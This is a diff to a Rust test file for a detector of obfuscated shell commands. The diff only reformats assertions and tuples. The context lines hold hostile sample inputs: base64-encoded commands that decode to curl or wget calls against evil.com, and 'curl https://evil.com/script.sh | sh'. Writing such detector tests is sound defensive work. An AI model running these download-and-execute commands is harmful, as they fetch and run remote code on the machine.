@@ -35,8 +35,8 @@ fn test_detect_base64_encoded_command() {
     // Detection can happen via entropy analysis OR suspicious command detection (base64 tool)
     assert!(
         assessment.reason.contains("entropy")
-        || assessment.reason.contains("base64")
-        || assessment.reason.contains("malicious"),
+            || assessment.reason.contains("base64")
+            || assessment.reason.contains("malicious"),
         "Should mention encoding or malicious context: {}",
         assessment.reason
     );
@@ -60,8 +60,8 @@ fn test_detect_hex_encoded_command() {
     // Detection can happen via entropy analysis OR suspicious command detection (xxd tool)
     assert!(
         assessment.reason.contains("entropy")
-        || assessment.reason.contains("hex")
-        || assessment.reason.contains("malicious"),
+            || assessment.reason.contains("hex")
+            || assessment.reason.contains("malicious"),
         "Should mention encoding or malicious context: {}",
         assessment.reason
     );
@@ -78,19 +78,19 @@ fn test_real_world_attack_vectors() {
         (
             "bash -c $(echo Y3VybCBldmlsLmNvbS9tYWx3YXJl | base64 -d)",
             "Base64 execution",
-            DangerLevel::Suspicious
+            DangerLevel::Suspicious,
         ),
         // Obfuscated wget - detected via base64 tool or eval
         (
             "eval $(echo d2dldCBldmlsLmNvbS9zaA== | base64 -d)",
             "Base64 obfuscated wget",
-            DangerLevel::Suspicious
+            DangerLevel::Suspicious,
         ),
         // Directly dangerous command
         (
             "curl https://evil.com/script.sh | sh",
             "RCE via pipe to shell",
-            DangerLevel::Dangerous
+            DangerLevel::Dangerous,
         ),
     ];
 
